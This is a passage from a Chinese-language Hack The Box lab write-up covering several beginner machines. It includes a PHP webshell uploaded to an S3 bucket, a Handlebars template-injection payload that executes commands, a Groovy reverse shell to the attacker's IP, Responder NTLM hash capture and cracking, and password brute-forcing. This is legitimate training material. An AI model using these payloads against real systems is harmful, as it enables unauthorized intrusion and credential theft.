127.0.1.1 htb-qpxebqmsfv htb-qpxebqmsfv.htb-cloud.com
10.129.30.97 thetoppers.htb
10.129.30.97 s3.thetoppers.htb


┌─[✗]─[tusoaring@htb-qpxebqmsfv]─[~/Desktop]
└──╼ $curl http://s3.thetoppers.htb/
{"status": "running"}
```

* 知道這是 aws 的 bucket，推測這應該是 bucket 的 `endpoint` (連接的端點)
* 用 `awscli` 這工具嘗試連接

```bash=
┌─[✗]─[tusoaring@htb-qpxebqmsfv]─[~/Desktop]
└──╼ $aws configure
AWS Access Key ID [****************temp]: {anything}
AWS Secret Access Key [****************temp]: {anything}
Default region name [temp]: {anything}
Default output format [temp]: {anything}
```

* 透過 `endpoint` 我們可以看到桶子有甚麼

```bash=
┌─[✗]─[tusoaring@htb-qpxebqmsfv]─[~/Desktop]
└──╼ $aws s3 --endpoint=http://s3.thetoppers.htb/ ls
2024-07-04 01:55:16 thetoppers.htb
```

* 看看 `thetoppers.htb` 這個桶子


```bash=
┌─[✗]─[tusoaring@htb-qpxebqmsfv]─[~/Desktop]
└──╼ $aws s3 --endpoint=http://s3.thetoppers.htb ls s3://thetoppers.htb
                           PRE images/
2024-07-04 01:55:16          0 .htaccess
2024-07-04 01:55:16      11952 index.php
```

* [想操作了話可以看這個](https://docs.aws.amazon.com/zh_tw/cli/latest/userguide/cli-services-s3-commands.html)

* 而這個桶子有網頁，還是用 php 寫的ㄟ，我們可以直接給個 webshell 上去!

```php=
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
```

```bash=
┌─[tusoaring@htb-qpxebqmsfv]─[~/Desktop]
└──╼ $aws s3 --endpoint=http://s3.thetoppers.htb cp ./webshell.php s3://thetoppers.htb
upload: ./webshell.php to s3://thetoppers.htb/webshell.php
```

![image](https://hackmd.io/_uploads/H1qZy1NPR.png)

* 成功執行!
* 最後在 /var/www 裡面看到 flag!

```bash=
a980d99281a28d638ac68b9bf9453c2b
```

## lgnition (Pwned!)

* NMAP 偵查拔 (っ °Д °;)っ

```bash=
┌─[tusoaring@htb-5qylkecaww]─[~/Desktop]
└──╼ $nmap -sC -sV -Pn -p- -T4 10.129.1.27
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-04 04:57 CDT
Nmap scan report for ignition.htb (10.129.1.27)
Host is up (0.011s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Home page

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.37 seconds
```

* 有個網頁服務，去看看
* 居然有 dns ，所以我們要在 `/etc/hosts` 新增解析

```bash=
┌─[✗]─[tusoaring@htb-5qylkecaww]─[~/Desktop]
└──╼ $cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	debian12-parrot

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
127.0.0.1 localhost
127.0.1.1 htb-5qylkecaww htb-5qylkecaww.htb-cloud.com
10.129.1.27 ignition.htb
```

* 回去後連上了，是個正常的網頁服務
* 拿個 `ffuf` 炸炸看

```bash=
┌─[✗]─[tusoaring@htb-5qylkecaww]─[~/Desktop]
└──╼ $ffuf -u 'http://ignition.htb/FUZZ' -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -c

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://ignition.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

#                       [Status: 200, Size: 25806, Words: 5441, Lines: 426, Duration: 81ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 25806, Words: 5441, Lines: 426, Duration: 105ms]
# Priority ordered case sensative list, where entries were found  [Status: 200, Size: 25806, Words: 5441, Lines: 426, Duration: 201ms]
# directory-list-2.3-small.txt [Status: 200, Size: 25806, Words: 5441, Lines: 426, Duration: 214ms]
# Copyright 2007 James Fisher [Status: 200, Size: 25806, Words: 5441, Lines: 426, Duration: 215ms]
                        [Status: 200, Size: 25806, Words: 5441, Lines: 426, Duration: 370ms]
home                    [Status: 200, Size: 25802, Words: 5441, Lines: 426, Duration: 578ms]
# on atleast 3 different hosts [Status: 200, Size: 25806, Words: 5441, Lines: 426, Duration: 578ms]
#                       [Status: 200, Size: 25806, Words: 5441, Lines: 426, Duration: 597ms]
# Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 25806, Words: 5441, Lines: 426, Duration: 612ms]
#                       [Status: 200, Size: 25806, Words: 5441, Lines: 426, Duration: 716ms]
# This work is licensed under the Creative Commons  [Status: 200, Size: 25806, Words: 5441, Lines: 426, Duration: 730ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 25806, Words: 5441, Lines: 426, Duration: 753ms]
# or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 25806, Words: 5441, Lines: 426, Duration: 1740ms]
#                       [Status: 200, Size: 25806, Words: 5441, Lines: 426, Duration: 1741ms]
contact                 [Status: 200, Size: 28673, Words: 6592, Lines: 504, Duration: 1743ms]
media                   [Status: 301, Size: 185, Words: 6, Lines: 8, Duration: 9ms]
0                       [Status: 200, Size: 25803, Words: 5441, Lines: 426, Duration: 2165ms]
static                  [Status: 301, Size: 185, Words: 6, Lines: 8, Duration: 7ms]
catalog                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 3995ms]
admin                   [Status: 200, Size: 7095, Words: 1551, Lines: 149, Duration: 4396ms]
Home                    [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 7861ms]
```

* 對 admin 蠻有興趣的，一進去是個登入頁面

![image](https://hackmd.io/_uploads/H11oQl4v0.png)

* 題目已經有提示 ` try searching for the most common passwords of 2023.` 
* 我們就拿腳本炸 (我是用 burp 先存請求，再丟給 GPT 轉 ffuf 炸)

```bash!
ffuf -w /path/to/wordlist.txt -X POST -d "form_key=wjENJFWRU4E83jBH&login[username]=admin&login[password]=FUZZ" -u http://ignition.htb/admin -H "Host: ignition.htb" -H "Content-Length: 80" -H "Cache-Control: max-age=0" -H "Upgrade-Insecure-Requests: 1" -H "Origin: http://ignition.htb" -H "Content-Type: application/x-www-form-urlencoded" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" -H "Referer: http://ignition.htb/admin" -H "Accept-Encoding: gzip, deflate, br" -H "Accept-Language: en-US,en;q=0.9" -H "Cookie: admin=be94dd2hm2iejfngbfbffs6ed5" -H "Connection: close"


Password = qwerty123 302 [found]
```

* 把 `admin/qwerty123` 拿去登入，dashboard+flag就出來了!

![image](https://hackmd.io/_uploads/Sk0DNx4DA.png)

## Bike (Pwned!)

* NMAP 起手 （；´д｀）ゞ

```bash=
┌─[tusoaring@htb-qfqoa89dyz]─[~]
└──╼ $nmap -sC -sV -Pn 10.129.60.80
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-04 23:34 CDT
Nmap scan report for 10.129.60.80
Host is up (0.0093s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    Node.js (Express middleware)
|_http-title:  Bike 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.02 seconds
```

* 有個網站，連進去看看

![image](https://hackmd.io/_uploads/B1oMQzHPR.png)

* 是個可以把你輸入回顯得網站，試試 `{{7*7}}`

```nodejs=
Error: Parse error on line 1:
{{7*7}}
--^
Expecting 'ID', 'STRING', 'NUMBER', 'BOOLEAN', 'UNDEFINED', 'NULL', 'DATA', got 'INVALID'
    at Parser.parseError (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:268:19)
    at Parser.parse (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:337:30)
    at HandlebarsEnvironment.parse (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/base.js:46:43)
    at compileInput (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js:515:19)
    at ret (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js:524:18)
    at router.post (/root/Backend/routes/handlers.js:14:16)
    at Layer.handle [as handle_request] (/root/Backend/node_modules/express/lib/router/layer.js:95:5)
    at next (/root/Backend/node_modules/express/lib/router/route.js:137:13)
    at Route.dispatch (/root/Backend/node_modules/express/lib/router/route.js:112:3)
    at Layer.handle [as handle_request] (/root/Backend/node_modules/express/lib/router/layer.js:95:5)
```

* 報錯了~而我們還可以看到它拿 [handlebars](https://medium.com/ling-ni-lee/handlebars%E7%AD%86%E8%A8%98-helper%E6%87%89%E7%94%A8-16978fd6c352) 當模板
     
* 去 [HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#handlebars-nodejs) 找一下 payload

```javascript=
ReferenceError: require is not defined
    at Function.eval (eval at <anonymous> (eval at createFunctionContext (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js:254:23)), <anonymous>:3:1)
    at Function.<anonymous> (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/helpers/with.js:10:25)
    at eval (eval at createFunctionContext (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js:254:23), <anonymous>:5:37)
    at prog (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/runtime.js:221:12)
    at execIteration (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/helpers/each.js:51:19)
    at Array.<anonymous> (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/helpers/each.js:61:13)
    at eval (eval at createFunctionContext (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js:254:23), <anonymous>:12:31)
    at prog (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/runtime.js:221:12)
    at Array.<anonymous> (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/helpers/with.js:22:14)
    at eval (eval at createFunctionContext (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js:254:23), <anonymous>:12:34)
```

* `require` 可能被禁掉ㄌ，這時候可以開始找資料
* 看到 [require](https://nodejs.org/api/globals.html#process) 其實不是在 Global 裡面，我們推測它應該跑在沙箱
* 試試看用 `process.mainModule.require`

```nodejs!
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return process.mainModule.require('child_process').execSync('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

![image](https://hackmd.io/_uploads/SJxKkEBD0.png)

* 我們是 root ㄟ，直接 `ls` `/root`

![image](https://hackmd.io/_uploads/rysoJ4HD0.png)

* GET FLAG!

```bash!
6b258d726d287462d60c103d0142a81c
```

## Pennyworth (Pwned!)

* nmap 起手囉 ヾ(≧▽≦*)o

```bash=
┌─[✗]─[tusoaring@htb-gkoyfeatio]─[~]
└──╼ $nmap -sC -sV -Pn -p- -T4 10.129.163.207
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-05 14:48 CDT
Nmap scan report for 10.129.163.207
Host is up (0.0091s latency).
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Jetty 9.4.39.v20210325
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
|_http-server-header: Jetty(9.4.39.v20210325)
| http-robots.txt: 1 disallowed entry 
|_/

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.18 seconds
```

* 找到了一個用 [Jenkins](https://tso-liang-wu.gitbook.io/learn-ansible-and-jenkins-in-30-days/jenkins/jenkins/jenkins-intro) 的登入管理頁面。
* 通靈了 `root/password` 居然過了

![image](https://hackmd.io/_uploads/rk6ke0HwC.png)

* 上網查了下資料，發現這邊有 `Groovy Script` 這種東西。
* 到 `http://10.129.163.207:8080/script` 就能 `RCE` 了
* 上網找找 Reverse shell 的 [Payload](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)

```bash!
String host="localhost";
int port=1337;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

* 還有注意一下這邊的 `host` 要填，下 `ip a` 的那個 ip

```bash!
┌─[tusoaring@htb-gkoyfeatio]─[~]
└──╼ $ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: ens3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether a6:ba:3b:08:30:84 brd ff:ff:ff:ff:ff:ff
    altname enp0s3
    inet 209.151.153.201/22 brd 209.151.155.255 scope global dynamic ens3
       valid_lft 82702sec preferred_lft 82702sec
    inet6 fe80::a4ba:3bff:fe08:3084/64 scope link 
       valid_lft forever preferred_lft forever
3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
    link/none 
    inet 10.10.15.22/23 scope global tun0
       valid_lft forever preferred_lft forever
    inet6 dead:beef:2::1114/64 scope global 
       valid_lft forever preferred_lft forever
    inet6 fe80::d13f:45c0:bde6:1c0/64 scope link stable-privacy 
       valid_lft forever preferred_lft forever
```

* 要填這個 `10.10.15.22`
* 所以最後 payload

```bash!
String host="10.10.15.22";
int port=1337;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

* 開個 `nc` 聽

```bash=
nc -lnvp 1337
```

![image](https://hackmd.io/_uploads/BkC6GASDA.png)

* GET FLAG!!

```bash!
ls /root
flag.txt
snap
cat /root/flag.txt
9cdfb439c7876e703e307864c9167a15
```

## Responder

* Nmap 起手++++

```bash!
┌─[tusoaring@htb-mcyhu7xtvf]─[~/Desktop/crack]
└──╼ $nmap -sC -sV -Pn -p- -T4 10.129.249.57
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-08 00:58 CDT
Nmap scan report for unika.htb (10.129.249.57)
Host is up (0.017s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
|_http-title: Unika
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 185.46 seconds
```

* 開了 port `5985` ，他是個處理 powershell 遠端的功能，但登入要帳密去看看其他的
* 先看看網頁服務，因為有 hosts 所以我們加到 `/etc/hosts` 解析

```bash!
┌─[tusoaring@htb-mcyhu7xtvf]─[~/Desktop/crack]
└──╼ $cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	debian12-parrot

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
127.0.0.1 localhost
127.0.1.1 htb-mcyhu7xtvf htb-mcyhu7xtvf.htb-cloud.com
10.129.249.57 unika.htb
```

* 觀察一下網頁，發現 `http://unika.htb/index.php?page=` 有 `LFI` 跟 `RFI`

![image](https://hackmd.io/_uploads/HJlYAQbFDC.png)

* 這裡不 `LFI->RCE` 因為 filter 建不起來
* 居然是滲透，我們玩玩看其他的
* 用 `responder` 抓登入口令的 HASH 值
* 最後爆破用 `evil-winrm` 去登入看看

### Responder (Pwned!)

* 這邊要用 `ip addr` 的 `tun0` 抓 (在內網)

```bash!
3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
    link/none 
    inet 10.10.14.118/23 scope global tun0
       valid_lft forever preferred_lft forever
    inet6 dead:beef:2::1074/64 scope global 
       valid_lft forever preferred_lft forever
    inet6 fe80::75ce:8c81:8c27:80cd/64 scope link stable-privacy 
       valid_lft forever preferred_lft forever
```

* 可以看到要用 `10.10.14.118`
* 先開始監聽

```bash!
┌─[tusoaring@htb-mcyhu7xtvf]─[~]
└──╼ $sudo responder -I tun0 -v
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [OFF]
    HTTPS server               [OFF]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.118]
    Responder IPv6             [dead:beef:2::1074]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-SA20U1ALR4U]
    Responder Domain Name      [6J4S.LOCAL]
    Responder DCE-RPC Port     [47487]

[+] Listening for events...
```

* 在網站有 RFI 的地方打上 `\\{IP}/{anything}`

![image](https://hackmd.io/_uploads/r1wrIWYPC.png)

* 按下 enter 後，hash 就反彈回來了
* 我們還可以順便知道 username 是 `Administrator`
* 接著我們用 `john` 嘗試破解 hash 破解密碼
* 先把剛剛錄到的 hash 存起來

```bash!
┌─[tusoaring@htb-mcyhu7xtvf]─[~/Desktop/crack]
└──╼ $cat crackme.txt 
Administrator::RESPONDER:11664cfb5bf8e620:8986474E950FCAC1E176EE5662C65038:01010000000000008096D986D1D0DA0148455363CDE03A720000000002000800580037005400440001001E00570049004E002D004600320048003500310053004800570036004400320004003400570049004E002D00460032004800350031005300480057003600440032002E0058003700540044002E004C004F00430041004C000300140058003700540044002E004C004F00430041004C000500140058003700540044002E004C004F00430041004C00070008008096D986D1D0DA0106000400020000000800300030000000000000000100000000200000BE59609986332FCCF305DB7549ED9FEEEDDE960B1BE3AE3EEF18FB50FC28681D0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100310038000000000000000000
```

* 好 我們用 john 去 破解

```bash!
┌─[tusoaring@htb-mcyhu7xtvf]─[~/Desktop/crack]
└──╼ $john --wordlist=/usr/share/wordlists/rockyou.txt crackme.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
badminton        (Administrator)     
1g 0:00:00:00 DONE (2024-07-08 01:27) 33.33g/s 136533p/s 136533c/s 136533C/s slimshady..oooooo
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

* 可以看到密碼是 `badminton`
* 用 `evil-winrn` 登入

```bash!
┌─[✗]─[tusoaring@htb-mcyhu7xtvf]─[~/Desktop/crack]
└──╼ $evil-winrm -i 10.129.249.57 -u Administrator -p badminton
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

* GET SHELL!
* 最後 flag 在 `mike` 的桌面~

```bash!
*Evil-WinRM* PS C:\Users\mike\Desktop> cat flag.txt
ea81b7afddd03efaa0945333ed147fac
```

## Tactics (Pwned!)

* NMAP 起手囉

```bash!
┌─[✗]─[tusoaring@htb-mcyhu7xtvf]─[~/Desktop/crack]
└──╼ $nmap -sC -sV -Pn -T4 -p- 10.129.143.166
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-08 04:59 CDT
Nmap scan report for 10.129.143.166
Host is up (0.0088s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-07-08T10:03:28
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 257.16 seconds
```

* 有 smb 服務，用工具看看有什麼咚咚
* 猜到帳號是 `Administrator`

```bash=
┌─[✗]─[tusoaring@htb-mcyhu7xtvf]─[~/Desktop/crack]
└──╼ $smbclient -L 10.129.143.166 -U administrator
Password for [WORKGROUP\administrator]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.143.166 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

* 用 `smbmap` 看看我們有甚麼權限

```bash=
┌─[tusoaring@htb-mcyhu7xtvf]─[~/Desktop/crack]
└──╼ $smbmap -H 10.129.143.166 -u Administrator
[+] IP: 10.129.143.166:445	Name: 10.129.143.166                                    
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	READ, WRITE	Remote Admin
	C$                                                	READ, WRITE	Default share
	IPC$                                              	READ ONLY	Remote IPC
```

* 都可以進ㄟ，直接連進去看看 `C$` 有甚麼

```bash!
┌─[tusoaring@htb-mcyhu7xtvf]─[~/Desktop/crack]
└──╼ $smbclient -U administrator \\\\10.129.143.166/C$
Password for [WORKGROUP\administrator]:
Try "help" to get a list of possible commands.
smb: \> 
```

* 去看看 `/User/Administrator/Desktop`

![image](https://hackmd.io/_uploads/SkgOnEFvC.png)

* 有 FLAG ㄟ，直接 `get` 他拿到 flag!

### 有個另解，可以 GET SHELL

* 用 [impacket](https://xz.aliyun.com/t/11877?time__1311=mqmx0DBD9DyDcGDnDBuQx20tr0QHPHmbehD&alichlgref=https%3A%2F%2Fwww.google.com%2F) 可以 get shell
* 用我們剛剛猜出來的 Username : Administrator

```bash=
┌─[tusoaring@htb-mcyhu7xtvf]─[~/Desktop/crack]
└──╼ $impacket-psexec Administrator@10.129.143.166
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
[*] Requesting shares on 10.129.143.166.....
[*] Found writable share ADMIN$
[*] Uploading file IQUuxrgv.exe
[*] Opening SVCManager on 10.129.143.166.....
[*] Creating service AdtA on 10.129.143.166.....
[*] Starting service AdtA.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> 
```

* GET SHELL!
* 最後再去一樣的地方 拿 flag 就好~

#### Windows

* `ls` : `dir`
* `cat` : `type`
* `grep` : `findstr`

## Funnel (Pwned!)

* Nmap 偵查

```bash=
┌─[tusoaring@htb-oztamikw6o]─[~/Desktop]
└──╼ $nmap -sC -sV -Pn -p- -T4 10.129.228.195
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-09 08:02 CDT
Nmap scan report for 10.129.228.195
Host is up (0.0082s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Nov 28  2022 mail_backup
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.118
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.99 seconds
```

* 有個 FTP ㄟ，一樣用 `anonymous` 連進去試試看

```bash=
┌─[✗]─[tusoaring@htb-oztamikw6o]─[~/Desktop]
└──╼ $ftp 10.129.228.195
Connected to 10.129.228.195.
220 (vsFTPd 3.0.3)
Name (10.129.228.195:root): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||43585|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Nov 28  2022 mail_backup
226 Directory send OK.
ftp> cd mail_backup
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||35204|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp         58899 Nov 28  2022 password_policy.pdf
-rw-r--r--    1 ftp      ftp           713 Nov 28  2022 welcome_28112022
226 Directory send OK.
ftp> get password_policy.pdf
local: password_policy.pdf remote: password_policy.pdf
229 Entering Extended Passive Mode (|||15526|)
150 Opening BINARY mode data connection for password_policy.pdf (58899 bytes).
100% |***********************************| 58899        3.38 MiB/s    00:00 ETA
226 Transfer complete.
58899 bytes received in 00:00 (2.24 MiB/s)
ftp> get welcome_28112022
local: welcome_28112022 remote: welcome_28112022
229 Entering Extended Passive Mode (|||36486|)
150 Opening BINARY mode data connection for welcome_28112022 (713 bytes).
